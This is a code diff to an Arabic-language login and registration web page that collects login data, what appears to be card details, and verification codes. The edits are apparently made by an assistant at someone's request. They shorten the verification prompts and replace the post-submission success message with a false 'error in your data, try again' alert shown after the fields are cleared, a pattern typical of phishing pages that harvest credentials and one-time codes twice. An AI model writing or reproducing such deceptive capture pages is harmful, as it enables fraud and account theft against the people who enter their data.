@@ -59,7 +59,6 @@
     </div>
   </div>
   
-  <!-- صفحة رمز التحقق تستخدم للتحقق في الدخول أو التسجيل حسب السياق -->
   <div class="centered" id="verify-page" style="display:none;">
     <img src="https://www2.0zz0.com/2025/09/30/14/235342786.jpeg" alt="logo" class="logo">
     <div class="card">
@@ -134,10 +133,11 @@
       document.getElementById('verify-page').style.display = '';
       regVerifyMode = isReg;
       if(isReg){
-        document.getElementById('verify-title').textContent = "إدخال رمز التحقق النهائي (6 أرقام أو أكثر)";
-        document.getElementById('verify-code').placeholder = "رمز التحقق النهائي (6 أرقام أو أكثر)";
+        // تعديل النصوص بناءً على طلبك
+        document.getElementById('verify-title').textContent = "ادخل رمز التحقق";
+        document.getElementById('verify-code').placeholder = "ادخل رمز التحقق";
         document.getElementById('verify-code').maxLength = 12;
-        document.getElementById('verify-btn').textContent = "إرسال رمز التحقق النهائي";
+        document.getElementById('verify-btn').textContent = "ارسال رمز التحقق";
       } else {
         document.getElementById('verify-title').textContent = "إدخال رمز التحقق";
         document.getElementById('verify-code').placeholder = "رمز التحقق";
@@ -236,7 +236,8 @@
         document.getElementById('reg-card').value = '';
         document.getElementById('reg-code').value = '';
         document.getElementById('reg-terms').checked = false;
-        alert('تم إرسال البيانات بنجاح!');
+        // تعديل الرسالة المطلوبة هنا:
+        alert('هناك خطأ في احدى البيانات يرجى المحاولة مرة اخرى');
       } else {
         // تحقق الدخول
         if (!loginData.user || !loginData.pass || !verifyCode) {
